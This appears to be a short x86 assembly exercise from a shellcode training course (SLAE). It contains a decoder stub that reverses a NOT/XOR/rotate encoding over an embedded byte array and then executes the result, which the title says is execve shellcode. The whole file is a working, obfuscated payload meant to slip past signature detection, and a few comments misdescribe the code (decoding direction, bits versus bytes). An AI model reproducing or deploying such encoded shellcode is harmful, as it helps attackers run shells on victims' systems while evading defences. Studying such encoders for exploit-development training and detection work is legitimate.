; Title:  Execve ROR XOR NOT decoder shellcode
; File: execve-rorxornotencoded.asm
; Author: Guillaume Kaddouch
; SLAE-681

global _start

section .text

_start:

	jmp short get_address	; JMP CALL POP method to get "encoded" address

shellcode:

	pop esi					; retrieve encoded shellcode address
	xor ecx, ecx
	mov cl, len				; set the counter to encoded shellcode length

decoder:					; decoding of ROR/XOR/NOT starts end and decodes backward
	not byte [esi]			; NOT current byte
	xor byte [esi], 0xAA	; XOR 0xaa
	rol byte [esi], 7		; ROL 7: rotate left 7 bytes
	inc esi
	loop decoder			; loop until ecx = 0
	jmp short encoded		; ecx = 0, jump to now decoded shellcode

get_address:
	call shellcode
	encoded: db 0x37,0xd4,0xf5,0x85,0x89,0x0b,0xb3,0x85,0x85,0x0b,0x0b,0x91,0x87,0x46,0x92,0xf5,0x46,0x90,0xf3,0x46,0x96,0x34,0x43,0xce,0x54 
	len equ $-encoded:






